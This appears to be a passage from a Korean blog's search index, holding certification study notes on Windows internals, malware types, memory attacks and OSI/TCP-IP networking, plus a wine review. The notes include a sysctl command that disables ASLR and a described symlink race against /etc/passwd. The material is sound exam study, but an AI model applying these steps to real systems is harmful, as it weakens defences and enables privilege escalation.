계정만 접근 가능                             HARDWARE           시스템 하드웨어 디스크립션, 모든 하드웨어의 장치 드라이버 매핑 정보                             COMPONENTS           설치된 컴포넌트와 관련된 정보 관리                             BCD00000000           부팅 환경 데이터를 관리, 과거 XP의 Boot.int 를 대체                           레지스트리 키            HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion : 윈도우 버전정보       HKLM\\SYSTEM\\ControlSet00X\\Control\\ComputerName\\ActiveComputerName : 컴퓨터 이름       HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run* : 시작프로그램 관련 (autoruns 프로그램으로 확인 가능)       HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run* : 시작프로그램 관련 (autoruns 프로그램으로 확인 가능)       HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU : 최근에 실행한 명령어           바이러스와 악성코드   1. 세대별 컴퓨터 바이러스     1세대 : 원시형 바이러스 (Primitive Virus)            단순, 분석이 쉬움       Jerusalem, Stoned 바이러스           2세대 : 암호화 바이러스 (Encryption Virus)            컴퓨터 프로그램 일부/전체를 암호화 시켜 백신으로부터 감염여부를 확인할 수 없게 함       암호화 방식이 일정, 복호화 방식도 일정       Cascade, Slow 바이러스           3세대 : 은폐형 바이러스 (Stealth Virus)            자기 스스로 은폐       다른 실행파일에 기생하여 그 실행파일의 크기를 증가시킴       감염 여부를 진단할 때 이전 상태를 보여줌       MacGyber, Brain, 512 바이러스           4세대 : 갑옷형 바이러스 (Armor Virus)            다양한 암호화 기법을 사용       Maltese_ameoba, Blue Sky, Whale 바이러스           5세대 : 매크로 바이러스            액셀이나 워드처럼 매크로 명령을 사용하는 프로그램을 감염시킴       운영체제와 관계없이 응용 프로그램에서 동작하는 바이러스       Melisa, Laroux, Nimda 바이러스           매크로 바이러스 예시            과거 HWP 악성코드                    포스트 스크립트 취약점과 셸코드를 결합한 방식                       북한 해킹 조직 ‘탈륨(Thallium)’ 제작 이메일 첨부파일 (HWP) 악성코드                    한컴 오피스 OLE(객체 연결 삽입) 기능을 악용해 숨어있는 HTA(HTML 응용프로그램) 실행           C&amp;C(명령제어) 서버와 통신해 추가적인 명령을 실행                               * OLE 기능이란? : 문서 내 링크나 이미지 혹은 패키지 등 다른 파일을 쉽게 삽입하고 연결   2. 감염대상에 따른 바이러스     부트 바이러스 : 부트 섹터에 영향을 주는 컴퓨터 바이러스   파일 바이러스 : 사용자가 사용하는 일반파일에 감염되는 바이러스   그 외   1. NetBIOS     컴퓨터에 있는 애플리케이션들이 근거리통신망(LAN) 내에서 서로 통신할 수 있게 해주는 프로그램. NetBIOS는 그 자체로 라우팅 기능(경로설정)을 지원하지 않고 광역통신망 상에서 통신하는 애플리케이션은 반드시 TCP와 같은 다른 Transport 매커니즘을 추가해서 사용해야 함.   OSI 모델에서 Session 과 Transport 계층의 서비스를 제공   Session 과  Datagram 두 가지 통신모드를 제공   2. systeminfo     시스템의 기본적인 정보 획득   3. DDE(Dynamic Data Exchange) 취약점     DDE : 윈도우 에서 애플리케이션 간 데이터 전송을 위한 프로토콜   애플리케이션 간 공유 메모리를 사용하여 데이터를 공유   특정 프로그램을 실행하면 다른 프로그램이 자동으로 실행됨.            예: MS Word : 문서 열 때 자동 연결 업데이트 –&gt; 해제필요           4. Shellcode     어셈블리어로 작성된 짧은 코드로 소프트웨어 취약점을 이용한다.   해당 코드가 메모리에 로딩되면 바로 악성코드가 실행된다.   msfvenom 이라는 도구를 사용해 생성   5. Heap Spray     Shell Code를 Heap 영역에 뿌리는 것   생성된 Shell Code는 Visual Studio를 복사한 후 전역변수를 선언해서 대입   Visual Studio에서 DEP(Data Execution Prevention)을 해제하여 컴파일하면 바로 실행   프로세스가 실행될 때 메모리에 적재되는 기본주소가 항상 동일하면 공격자는 해당 주소를 하드코딩해서 자신의 ShellCode를 임의로 적재하여 악성코드를 실행하게 할 수 있다. –&gt; 기본주소(ImageBase) 의 동적할당 필요   6. ASLR(Adress Space Layout Randomization)     실행 파일이 메모리에 로드될때 기본주소(ImageBase) 는 항상 동일한 주소임   동일한 메모리 주소를 가지면 공격자에게 매우 취약한 문제점이 발생   이 주소를 랜덤하게 배치하는 것            윈도의 경우 Vista 부터 메모리의 주소를 항상 동적 할당       리눅스의 경우       sysctl -w kernel.randomize_va_space=0 : 해제       sysctl -w kernel.randomize_va_space=1 : 설정           7. 버퍼 오버플로우(Buffer Overflow)     프로세스가 사용 가능한 메모리 공간을 초과해서 발생되는 공격   C, C++ 등으로 개발할 때 메모리 공간에 제한을두지 않는 API를 사용해서 발생        프로세스 메모리 구조                                  상위 메모리 주소 (0xFFF)                                                       argv(문자열)                                         argv(포인터)           프로그램을 실행할 때의 입력값                             argc                                         스택영역(Stack Area)           지역변수와 함수 복귀주소 저장                             ↓메모리 할당방향↑                                         힙영역(Heap Area)           동적 메모리 할당                             데이터(.bss)           초기화되지 않은 변수                             데이터(.data)           초기화된 변수                             코드(.text)                                         하위 메모리 주소 (0x000)                                       스택 버퍼 오버플로우            스택에 저장되어 있는 복귀주소가 지역변수에 의해서 침범당하는 공격           버퍼 오버런            메모리 공간에 할당된 공간보다 더 큰 데이터를 입력하여 프로그램 오류 유발       프로그램 오류를 유발하여 시스템을 장악하거나 Shellcode를 복사하여 악성코드를 실행           힙 버퍼 오버플로우            힙 영역은 동적으로 할당되는 공간       경계 값을 검사하지 않고 메모리를 사용하면 경계를 초과           8. Race Condition 공격     원리 : 심볼릭링크를 수정하면 원본파일도 수정된다.   setUID 가 걸린 “rc” 라는 프로그램이 있고, 이 프로그램이 실행될 때 /tmp/hi 라는 임시파일을 만든다고 가정   rc 에는 setUID 가 걸려있으므로 실행되는 동안에는 root 권한을 가짐   /tmp/hi 파일을 삭제하고 /etc/passwd 의 심볼릭링크 파일로 /tmp/hi 를 생성하고 rc를 실행시킴   rc 실행중에는 root 권한을 가지므로 /tmp/hi 파일을 수정함으로써 /etc/passwd 를 수정할 수 있다.   setUID 가 걸린 “rc” 프로그램이 임시 파일을 생성하고 내용을 쓰는 용도를 권한이 없는 파일에 내용을 쓰는 용도로 바꾸기 위해 링크 파일을 중간에 끼워넣음   9. APT 공격     Advanced Persistent Threat : 특정 기법 및 조직을 대상으로 다양한 공격 기법을 사용하여 지속적으로 공격을 수행   사회관계망 서비스를 사용하여 정보 수집, 악성 코드 배포를 수행하고 공격표적을 선정하여 지속적으로 공격을 수행   Zero Day Attack : 소프트웨어 패치 전에 취약점을 이용한 공격   Mail APT : 악성코드를 메일에 첨부하여 발송하고 이를 통해서 정보를 획득   백도어 APT : 표적에 침투 후 백도어를 설치하여 재침입 시에 유입경로를 열어두는 것   단계            침투 : Email, USB, 웹사이트를 통한 악성코드 등       탐색 : Network 정보, 시스템 정보, 계정 정보 및 DB/시스템 구조에 대한 정보       수집/공격 : 목표로 한 데이터 수집 혹은 시스템 공격       유출 : 분석 및 추가 공격 혹은 금전적 이익을 취하기 위해 정보 유출           10. 바이너리 디핑(Binary)     Zero Day Attack 취약점을 찾을 수 있는 기법   디핑 기술을 사용, 스크립트된 바이너리 함수 정보를 획득   Malware 탐지, 오픈소스 라이선스 준수여부 확인  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","시스템 보안","윈도우 보안"],
        "url": "https://bluesplatter.com/is_certification/ISCert-01System-04Window/",
        "teaser": null
      },{
        "title": "Masi Campofiorin Rosso Veronese 마시 캄포피오린 (2016)",
        "excerpt":"1. 구매정보     빈티지 : 2016   가격 : 27000 원   구매처 : 롯데마트 서울역   2. 비비노      링크   2. 감상     1일차            토마토 향, 담배향, 체리       포도껍질, 텁텁함, 신선한 느낌           3. 총점     3.8/5  ","categories": ["Wine"],
        "tags": ["와인"],
        "url": "https://bluesplatter.com/wine/Wine_masi-campofiorin-rosso-veronese/",
        "teaser": null
      },{
        "title": "02.네트워크 보안 - 01.네트워크 개념",
        "excerpt":"네트워크와 프로토콜     프로토콜            메시지의 포맷, 언제 데이터를 보낼 것인지, 한번 전송하고 한번 응답할지 등.       OSI7 계층, TCP/IP 4계층       다른 약속을 한 송 수신자 간 통신 : 게이트웨이 장비 필요           데이터 전송방식 (OSI7 -&gt; 세션계층)            단방향 (Simplex) : 키보드, 모니터       반이중 (Half Duplex) : 송수신을 동시에 하는 것이 불가능       전이중(Full Duplex) : 동시에 양방향 송수신           네트워크 토폴로지     계층형            Tree 구조 / 최상위 노드가 네트워크 제어       통제 및 유지보수 용이       중앙 컴퓨터 장애 시 전체 통신망 영향           버스형            중앙 통신 회선 하나에 여러 대의 노드 연결       하나의 컴퓨터가 다운되어도 나머지에 지장 없음       우선순위 제어가 어렵고 충돌이 자주 발생           스타형            중앙 컴퓨터를 중심으로 터미널이 연결된 중앙집중형       유지보수 및 관리가 용이       중앙 컴퓨터 고장 시 네트워크 전체 마비           링형            인접해 있는 노드들을 연결하는 단방향 전송 형태       단말기 추가 및 삭제가 어려움           망형            모든 노드들이 상호 연결       가장 많은 통신 선로가 필요           OSI 7계층   1. OSI 7계층 구조                  OSI 7계층       주요 내용       주요 프로토콜(매체)                       7. Application (Gateway)       ⦁ 사용자 소프트웨어를 네트워크에 접근 가능하도록 함 ⦁ 사용자에게 최종 서비스를 제공       FTP, SNMP, HTTP, Mail, Telnet 등                 6. Presentation       ⦁ 포맷기능, 압축, 암호화 ⦁ 텍스트 및 그래픽 정보를 컴퓨터가 이해할 수 있는 16진수 데이터로 변환       ⦁ 압축, 암호, 코드 변환 ⦁ GIF, ASCII, EBCDIC                 5. Session       ⦁ 세션 연결 및 동기화 수행, 통신 방식 결정 ⦁ 가상 연결을 제공하여 Login/Logout 수행       반이중, 전이중, 완전이중 결정                 4. Transport       ⦁ 가상연결, 에러 제어, Data 흐름 제어, Segment 단위 ⦁ 두 개의 종단 간 End-to-End 데이터 흐름이 가능하도록 논리적 주소 연결 ⦁ 신뢰도, 품질보증, 오류탐지 및 교정 기능 제공 ⦁ 다중화(Multiplexing) 발생       TCP, UDP                 3. Network (Router)       ⦁ 경로선택, 라우팅 수행, 논리적 주소 연결(IP) ⦁ 데이터 흐름 조절, 주소 지정 메커니즘 구현 ⦁ 네트워크에서 노드에 전송되는 패킷 흐름을 통제하고, 상태 메시지가 네트워크 상에서 어떻게 노드로 전송되는가를 정의, Datagram(Packet) 단위       ⦁ IP, ICMP, IGMP, ARP, RAPR ⦁ 라우팅 프로토콜(RIP, OSPF, BGP)                 2. Data Link (Switch, Bridge)       ⦁ 물리주소 결정, 에러 제어, 흐름 제어, 데이터 전송 ⦁ Frame 단위, 전송 오류를 처리하는 최초의 계층       ⦁ 흐름 제어, 오류 제어(ARQ) ⦁ 브릿지, PPTP, L2TP, HDLC ⦁ Frame Relay                 1. Physical (Repeater)       ⦁ 전기적, 기계적 연결 정의, 실제 Data Bit 전송 ⦁ Bit 단위, 전기적 신호, 전압구성, 케이블, 인터페이스 등을 구성 ⦁ Data Rates, line noise control, 동기화 기능 수행       매체: 동축케이블, 광섬유, Twisted Pair Cable           - 다중화(Multiplexing) : 여러 개의 소캣으로부터 데이터를 수집하여 헤더를 붙여 전송 - End-to-End : 7~4 계층, 송수신자 간의 에러 Control - Point-to-Point : 3~1 계층, 각 구간에 대해 에러 Control   2. OSI 계층별 하드웨어 장비                  계층       장비명       설명                       Physical       Cable       Twisted Pair Cable, Coaxial, Fiber-Optic Cable                         Repeater       ⦁ 네트워크 구간 케이블의 전기적 신호를 재생하고 증폭하는 장치 ⦁ 디지털 신호를 제공, 아날로그 신호 증폭 시 잡음과 왜곡까지 증폭                 Data Link       Bridge       ⦁ 서로 다른 LAN Segment를 연결, 관리자에게 MAC 주소 기반 필터링 제공하여 더 나은 대역폭(Bandwidth) 사용과 트래픽을 통제 ⦁ 리피터와 같이 데이터 신호를 증폭하지만, MAC 기반에서 동작                         Switch       ⦁ 목적지의 MAC 주소를 알고 있는 지정된 포트로 데이터를 전송 ⦁ Repeater 와 Bridge의 기능을 결합 ⦁ 네트워크의 속도 및 효율적 운영, Data Link 계층에서도 작동                 Network       Router       ⦁ 패킷을 받아 경로를 설정하고 패킷을 전달 ⦁ Bridge는 MAC 주소를 참조하지만, Router는 네트워크 주소까지 참조하여 경로를 설정 ⦁ 패킷 헤더 정보에서 IP 주소를 확인하여 목적지 네트워크로만 전달하며 Broadcasting을 차단                 Application       Gateway       ⦁ 서로 다른 네트워크망과의 연결(PSTN, Internet, Wireless Network 등) ⦁ 패킷 헤더의 주소 및 포트 외 거의 모든 정보를 참조           TCP/IP 4계층   1. TCP/IP 구조                  OSI 7계층       TCP/IP 4계층       주요 기능                       ⦁ Application ⦁ Presentaion ⦁ Session       Application       ⦁ 네트워크를 실제로 사용하는 응용 프로그램으로 구성 ⦁ FTP, TELNET, SMTP 등이 있음                 Transport       Transport       ⦁ 도착하고자 하는 시스템까지 데이터를 전송 ⦁ Port를 가지고 있으며, 프로세스를 연결 또는 비연결해서 통신함 ⦁ TCP,UDP                 Network       Internet       ⦁ Datagram을 정의하고 Routing하는 일을 담당 ⦁ IP, ARP, RARP, ICMP, IGMP                 ⦁ Data Link ⦁ Physical       Network Access       케이블, 송수신기, 링크 프로토콜, LAN 접속과 같은 물리적 연결 구성을 정의           2. TCP/IP 프로토콜의 구성 : TCP, UDP, IP, ICMP, ARP, RARP      이미지 출처      TCP : Connection Oriented Protocol (연결지향)로 사용자에게 신뢰성 있는 서비스를 지원. 신뢰성 있는 서비스를 지원하기 위해서 Error Control 기법을 포함하고 있으며, 송신자가 보낸 메시지를 수신자가 전송받았는지 확인하기 위해서 수신자를 ACK 를 송신자에게 전송. 만약 ACK가 오지 않거나 동일한 ACK 번호가 오면 다시 전송   UDP : Connectionless Protocol(비연결)로 데이터 전송을 보장하지 않는 비신뢰성 서비스를 제공하지만, TCP에 비해서 전송 속도가 빠른 특징을 가진다.   ARP : IP Address 를 LAN 카드의 물리적 주소인 MAC 주소로 변환한다.   RARP : MAC 주소를 IP Address 로 변환하는 역할을 수행한다.   ICMP : 네트워크 오류와 상태를 점검하기 위해서 사용된다.   IP : 네트워크 주소와 호스트 주소 정의에 의한 네트워크의 논리적 관리를 담당하는 것으로 송신자와 수신자의 주소를 지정한다.   네트워크 활용(TCP/IP 구조)   1. 애플리케이션 계층          일반 사용자들이 사용하는 프로그램이 있는 계층                                  서비스           내용                                           FTP           ⦁ File Transfer Protocol ⦁ 사용자 파일의 업로드 혹은 다운로드를 수행하는 프로그램 ⦁ 파일 전송을 위한 인터넷 표준으로 제어 접속과 데이터 접속을 위한 분리된 포트를 사용함                             DNS           ⦁ Domain Name Service ⦁ DNS Query를 사용해서 DNS Server에 URL을 전송하고 해당 URL에 매핑되는 IP 주소를 제공하는 서비스                             HTTP           ⦁ Hyper Text Transfer Protocol ⦁ 웹브라우저와 웹 서버 사이에 웹 페이지의 Request 와 Response 를 수행하는 프로토콜                             Telnet           ⦁ 특정 지역의 사용자가 지역적으로 다른 곳에 위치한 컴퓨터를 온라인으로 연결하여 사용하는 서비스                             SMTP           ⦁ Simple Mail Transfer Protocol ⦁ RFC 821에 명시된 인터넷 전자우편을 위한 프로토콜로 메시지 전달을 위해서 Store and Forward 방식을 사용 ⦁ 암호화 및 인증 기능 없이 사용자의 e-Mail을 전송하는 프로토콜                             SNMP           ⦁ Simple Network Management Protocol ⦁ 네트워크에 대한 트래픽, 세션 등의 네트워크 상태를 모니터링하고 정보를 전달할 때 사용되는 프로토콜                           1. HTTP(Hyper Text Transfer Protocol)     HTTP 프로토콜 개요            WWW(World Wide Web)로 시작되는 인터넷에서 웹 서버와 사용자의 인터넷 브라우저 사이에 문서를 전송하기 위해 사용되는 통신 프로토콜       TCP 기반 프로토콜의 80번 Port 를 사용하고 Request 및 Response 구조를 가짐       State-less 로 프로토콜을 구성함 (요청 / 응답 후 연결종료)           HTTP Version 1.0            연결을 수행할 때마다 3-Way handshaking 기법을 사용       HTML 페이지를 수신 받고 완전히 연결을 종료시킴       필요 시 다시 연결하고 페이지를 수신받음           HTTP Version 1.1            연결을 종료하지 않고 유지되는 Keep Alive Connection 을 지원       연속된 연결 요청이 있을 경우 HTML 페이지를 수신받고 연결을 종료하지 않은 상태에서 이미지 등을 요청하는 형태의 서비스           HTTP Version 2.0            멀티플랙싱(Multiplexing), 헤더압축(Header Compression), 서버 푸시(Server Push) 등의 기술이 추가됨                    멀티플랙싱 : 순차적 연결이 아니라 동시 다발적인 양방향 통신 지원           헤더압축 : 헤더정보를 1/3 수준으로 압축, 보다 빠르게 메시지 처리           서버푸시 : 웹 서버가 웹브라우저에게 필요한 데이터를 알아서 미리 전송할 수 있는 기술로 요청횟수와 전송해야 하는 데이터의 양을 줄임                           HTTP 세션 연결 과정 (3-Way handshaking)      이미지 출처      HTTP Request 시 Header 구조            HTTP Header 와 Body 의 구분은 \\r\\n\\r\\n                                      구조           설명                                           Request Method           호출되는 메소드로 GET 혹은 POST, OPTIONS, PUT, DELETE, TRACE, CONNECT 인지를 나타냄                             Accept           웹 브라우저에서 사용 가능한 미디어 타입을 의미, text/*, text/html 등                             Accept-Language           웹브라우저가 인식할 수 있는 언어를 의미                             User-Agent           웹브라우저 정보를 의미                             Accept-Encoding           웹브라우저에서 제공되는 인코딩 방식을 의미                             Host           웹 서버의 기본 URL을 의미                             Connection           연결 지속 및 연결 끊기를 나타내며 Keep Alive 혹은 close                                HTTP 요청 방식                                  요청 방식           내용                                           GET 방식           ⦁ 서버에 전달할 때 데이터를 URL에 포함시켜서 요청 ⦁ 전송할 수 있는 데이터 양이 제한됨(2Kbyte 또는 4Kbyte) ⦁ 예) aa.php?userid=a&amp;password=a                             POST 방식           ⦁ 서버에 전달할 때 데이터를 Request Body에 포함시킴 ⦁ 데이터 전송량의 제한이 없음 ⦁ 예)aa.php userid=a;password=a                                HTTP Response 시 Header 구조                                  구조           설명                                           Status Code           HTTP 응답 코드를 의미하고 200은 성공적으로 처리한 것을 의미                             Server           서버 프로그램 이름과 버전 전송을 의미 예)Apache/2.2.22 (Debian)\\r\\n                             Expires           자원의 만기 일자를 의미                             Cache Control           캐시 사용 여부를 나타내며 no-cache는 캐시를 사용하지 않음                             Pragma           캐시 사용 여부를 나타냄. HTTP/1.0 에서 쓰이며 HTTP/1.1에서는 Cache-Control 이 쓰임                             Content-Encoding           응답되는 메시지의 인코딩 방식을 의미                             Content-Length           바이트 단위로 응답되는 리소스의 크기                             Keep-Alive           연결 유지 시간을 의미하며 위의 예는 timeout 5초, 최대 100초로 설정되어 있음                             Connection           Keep-Alive 사용 여부를 의미                             Content-Type           응답되는 미디어 타입                                Cookie 와 Session                                  방식           Cookie           Session                                           저장 위치           클라이언트           서버                             저장 형태           Text 형식           Object 형식                             종료 시점           쿠키 저장 시에 종료 시점을 설정하며,  설정하지 않으면 브라우저 종료 시점이 됨           정확한 시점을 알 수 없음                             자원           클라이원트 자원           서버 자원                             용량           한 도메인당 20개, 쿠키 하나에 4Kb, 총 300개           용량 제한 없음                           2. SMTP (Simple Mail Transfer Protocol)      이미지 출처      SMTP 개요            RFC 821에 명시되어 있는 인터넷 전자우편 표준 프로토콜       Store-and-Forward 방식으로 메시지를 전달       송신자 메일 -&gt; Store -&gt; Mbox -&gt; Forward -&gt; 수신자 메일       TCP 25           SMTP 기본 동작 방식            송신자가 보낸 전자우편은 전자우편을 관리하는 메일서버에 전달됨       메일 서버는 수신자의 전자우편 주소를 분석, 최단 경로를 찾아 근접한 메일 서버에게 편지를 전달       최종 수신자 측 메일 서버에 도착하기까지 연속적으로 전달하는 중계 작업을 수행                                      구성요소           내용                                           MTA(Mail Transfer Agent)           메일을 전송하는 서버                             MDA(Mail Delivery Agent)           수신측에 고용된 우체부의 역할, MTA에게 받은 메일을 사용자에게 전달                             MUA(Mail User Agent)           사용자들이 사용하는 클라이언트 애플리케이션                                POP3와 IMAP 및 IMAP3                                  POP3           IMAP 및 IMAP3                                           ⦁ TCP 110번으로 메일서버에 접속하여 저장된 메일을 내려받는 MDA 프로그램 ⦁ 메시지를 읽은 후 메일 서버에서 해당 메일을 삭제함           ⦁ POP과 달리 메일을 내려받아도 메일 서버에 원본을 계속 저장 ⦁ IMAP 143 Port                           3. FTP (File Transfer Protocol)     FTP 개요            인터넷 표준으로 파일 전송을 위한 프로토콜       해당 컴퓨터에 등록된 사용자만 전송 가능, 그 외에는 익명(Anonymous)으로 사용       ftpusers 에 등록된 사용자는 FTP 접근이 허용되지 않음       제어 접속과 데이터 접속 포트가 분리되어 있음           FTP 전송모드                     Active Mode              이미지 출처                      서버 TCP/21번 포트로 접속 시도           서버 TCP/20번 포트로 데이터를 송수신                                Passive Mode              이미지 출처                      서버 TCP/21번 포트로 접속한 후 두 번쨰 포트를 질의           서버는 클라이언트에게 데이터 연결을 위한 두 번째 포트(TCP/1024이상)을 알려줌           클라이언트는 서버가 알려준 두 번째 포트로 접속                           4. SNMP  와 NMS     NMS (Network Management System) : 운영되는 네트워크의 안정성, 효율성을 높이기 위해서 구성,장애,통계,상태정보를 실시간 수집 및 분석하는 네트워크 관리시스템   SNMP (Simple Network Management Protocol) : 이 떄 사용되는 프로토콜   2. 전송 계층(Transport Layer)     수신측에 전달되는 데이터에 오류가 없고 데이터의 순서가 그대로 보존되도록 보장하는 연결 지향 서비스(Connection Oriented Service)의 역할을 하는 종단 간(End-to-End) 서비스 계층   신뢰성 있는 전송을 하는 TCP / 비신뢰성 전송을 하는 UDP 프로토콜이 존재   애플리케이션 계층의 메시지에 TCP 혹은 UDP의 Header 를 붙인 것을 Segment 라 함.   1. TCP (Transmission Control Protocol)     전송 계층의 프로토콜   연결지향(Connection Oriented)            가상 연결을 수행                    실제 물리적으로 연결된 것이 아니어서 주기적으로 메시지(ICMP 프로토콜)를 송수신하여 송수신 가능 여부를 확인함.                           3-Way Handshaking            SYN -&gt; SYN+ACK -&gt; ACK           신뢰성 있는 데이터 전송            송신자가 메시지를 전송하면 수신자는 ACK를 되돌려서 수신 여부를 확인해줌       동일한 ACK 번호를 반복적으로 전송한다면 어떤 이유로든 데이터를 받지 못하는 것이고, 반복적인 ACK가 되돌아오면 TCP는 에러 제어기법을 통해 재전송을 수행함           순서 제어(Sequence Control)            Sequence 번호를 가지고 메시지의 순서를 파악                    비동기 방식으로 데이터 전송 시 다른 경로로 보내질 수 있기 때문에 송신자의 메시지가 꼭 순서에 따라 도착하지 않음                           완전 이중(Full Duplex)            송신과 수신을 동시에 함           에러 제어            FEC(Forward Error Correction)                    송신 측이 특정한 정보 비트를 함께 전송하여 수신측에서 이 정보 비트로 에러 발생 시 수정하는 방식 (수신측이 에러 처리)           재전송 요구가 없음           오류 검출 및 수정을 위한 잉여 비트 추가 -&gt; 전송 효율 감소           해밍 코드, 상승 코드 등                       BEC(Backward Error Correction)                    수신 측이 에러 검출 후 송신측에게 에러가 발생한 데이터 블록을 다시 전송 요청           패리티 검사, CRC 등 Checksum 을 이용해 오류 검출 후 오류 제어는 ARQ(Auto Repeat Request) 가 처리                            Checksum 은 TCP, UDP 모두에 존재, 송신중에 메시지의 변조를 파악하기 위한 송/수신자 간 에러 체크 방법                                   BEC 기법 특징                                                          기법               Stop-and-Wait               Go-Back-N(TCP)               Selective Repeat                                                               재전송 요청 방법               에러발생 즉시 재전송               오류 발생 또는 잃어버린 프레임 이후의 모든 프레임을 재요청하거나 타임아웃으로 자동 재송신 됨               오류 발생 또는 잃어버린 프레임에 대해서만 재요청 또는 타임아웃으로 인한 자동 재송신                                         수신 방법               순차적으로 수신               프레임의 송신 순서와 수신 순서가 동일해야 수신               순서와 상관없이 윈도우 크기만큼의 범위 내에서 자유롭게 수신                                         장단점               ⦁ 가장 단순한 구현 ⦁ 신뢰성 있는 전송 ⦁ 대기시간 존재로 전송 효율 저하               ⦁ 간단한 구현 ⦁ 적은 수신측 버퍼 사용량               ⦁ 구현이 복잡 ⦁ 버퍼 사용량이 많음 ⦁ 보다 적은 재전송 ⦁ 대역폭                                                   흐름 제어 (Flow Control)            송수신측 사이의 전송 패킷의 양, 속도를 조절하여 네트워크를 효율적으로 사용       수신자가 메시지를 제대로 받지 못하면 송신자가 전송 속도를 낮춤       수신자의 Buffer Overflow 를 방지       슬라이딩 윈도우(Sliding Window) (TCP)                    TCP 호스트 간 효율적 데이터전송을 위해 송수신 할 수 있는 Size 정보를 제공, Size를 맞춤 / Ack 를 묶어서 처리           Stop-and-Wait의 단점을 보완한 방식으로 수신측의 확인 신호를 받지 않더라도 미리 정해진 프레임의 수만큼 연속적으로 전송                           혼잡제어 (Congestion Control)            Router 가 처리할 수 있는 packet 양보다 더 많은 packet 전송 시 비효율       TCP Slow Start                    TCP가 시작될 때 전송속도를 초기값부터 지속적으로 올리는 방법           Receive Windows : 수신자의 윈도우 크기 (메모리 버퍼). 수신자의 버퍼 상태를 보고 전송속도를 조절           Sender 에서 packet을 전송하는 비율과 Receiver 에서 수신된 ACK를 통해 congestion window(cwnd) 를 지수의 크기로 증가시키는 방법                                TCP 상태전이          이미지 출처             netstat 명령어로 TCP 상태 확인                    netstat -b : 어떤 프로세스가 네트워크를 사용하는지 확인                                TCP 헤더 구조              이미지 출처       Control Flag            SYN : 연결 동기화       ACK : 응답 확인       PSH : 버퍼링 미 수행, 송신요구       URG : 긴급 포인터       FIN : 정상 접속 종료       RST : 비정상 종료를 위한 Reset           2. UDP (User Datagram Protocol)     비연결성, 비신뢰성의 특성으로 Packet을 빠르게 전달        송수신의 여부에 대한 책임을 Application이 가진다.                                  특징           내용                                           비신뢰성(Unreliable)           Packet을 목적지에 성공적으로 전송한다는 것을 보장하지 않음                             비접속형(Connectionless)           전달되는 Packet에 대한 상태 정보를 유지하지 않음                             간단한 Header 구조           TCP에 비해 헤더 구조가 간단하여 처리가 단순함 (TCP 세그먼트의 헤더 20byte, UDP 세그먼트의 헤더 8byte)                             빠른 전송           TCP에 비해 전송속도가 빠름                                UDP 프로토콜의 Header 구조              이미지 출처             가상 선로(Virtual Circuit)의 개념이 없는 비연결성       블록 단위로 데이터 전송       블록 재전송 및 흐름 제어 등이 없음 (데이터 신뢰성이 없음)       CRC 무결성 검사       슬라이딩 윈도우 등의 복잡한 기술을 사용하지 않음       UDP의 각 사용자는 16bit의 포트 번호를 할당 받음           UDP 를 사용하는 VoIP(Voice Over IP)            빠르게 데이터를 전송해야 하는 서비스       내부적으로 2개의 프로토콜을 사용                    RTP(Real Time Protocol) - 음성을 전송           RTCP(Real Time Control Protocol) - 에러처리                       스니핑 노출로 인한 사생활 침해 취약점       DDoS 보안 취약점           3. 인터넷 계층(Internet Layer)     송신자의 IP 주소와 수신자의 IP 주소를 읽어 경로 결정, 전송하는 역할   다중 네트워크 링크를 통해 패킷의 발신지 대 목적지 전달에 대한 책임을 가짐 (DataLink 층은 노드간 전달 책임) (Point to Point)   인터넷 계층은 IP, ICMP 의 TCP/IP 프로토콜 군이 존재하고 멀티캐스팅을 위한 IGMP(Internet Group Management Protocol), 라우팅을 위한 BGP, OSPF, RIP 등이 존재        경로결정(Routing) 은 수신자의 IP 주소를 읽어서 어떻게 목적지까지 가는 것이 최적의 경로인지를 판단하는 것이며, 이러한 작업을 하는 것은 라우터(Router)라는 네트워크 장비이다.       기능            경로설정(Routing) : 경로를 결정       Point to Point packet 전달       논리 주소 지정 (Logical Addressing) : IP 주소로 변환해서 사용       주소 변환 (Adress Transformation)       데이터그램(Datagram) : 기존 패킷(Packet)에 IP Header 를 붙이는 것을 의미           1. 라우팅   1. 개념     정적 경로 (Static Routing)            관리자가 최적의 경로로 설정       라우터의 직접적인 처리 부하 감소       환경변화가 적은 형태의 네트워크에 적합       Floating static routing           동적 경로 (Dynamic Routing)            네트워크 환경변화에 능동적인 대처가 가능       라우터 간에 자동으로 정보를 교환, 경로 설정       수시로 환경이 변화되는 형태의 네트워크에 적합       Distance Vector routing, Linked state routing           라우팅 범위에 따른 라우팅 프로토콜 종류            IGP(Internal Gateway routing protocol) : 동일 그룹(기업 또는 ISP) 내에서 라우팅 정보를 교환       EGP(Exterior Gateway routing protocol) : 다른 그룹과의 라우팅 정보를 교환                라우팅 프로토콜 분류                                  구분           Distance Vector           Link State                                           알고리즘           최단경로(Shorter Path)를 구하는 벨만 포드(Bellman-Ford) 알고리즘 기반           최소 신장 트리(Shortest Path Tree)를 구하는 다익스트라(Dijkstra) 알고리즘 기반                             동작 원리           네트워크 변화 발생 시 해당 정보를 인접한 라우터에 정기적으로 전달 하고, 인접 라우터에서는 라우팅 테이블에 정보 갱신           ⦁ 라우터와 라우터를 연결하는 Link 상태에 따라 최적의 경로 설정 ⦁ 라우터가 Network 변화 감지 시 링크 상태변경 정보를 인접한 라우터에게 즉각 전달하고 이를 저장함                             라우팅 정보           모든 라우터까지의 거리 정보 보관           인접 라우터까지의 Link Cost 계산                             정보전송 시점           일정주기(30초, 이웃 라우터와 공유)           변화 발생 시에만                             대표 프로토콜           RIP, IGRP, EIGRP(내부 라우팅), BGP           OSPF(가장 많이 사용됨), IS-IS(소규모 N/W에서 사용)                             단점           ⦁ 변화되는 라우팅 정보를 모든 라우터에 주기적으로 갱신하므로 망 자체의 트래픽을 유발 ⦁ 라우팅 정보를 변경하는 문제 발생 시 Routing Loop가 발생할 가능성이 있음           ⦁ 네트워크 전체 정보 유지를 위한 많은 메모리 소요 ⦁ 라우터의 CPU 사용량이 많아짐 ⦁ 라우터간 회선의 대역차이로 동기화 실패할 가능성이 있음                                  Distance Vector                    통과해야 하는 라우터의 수가 적은 쪽으로 경로를 결정           홉 카운터(Hop count) / TTL (Time to Live)           RIP, IGRP                       Link State                    네트워크 대역폭, 지연 정보 등을 종합적으로 고려해 Cost 산정           주기적으로 지연과 같은 정보를 라우터 간에 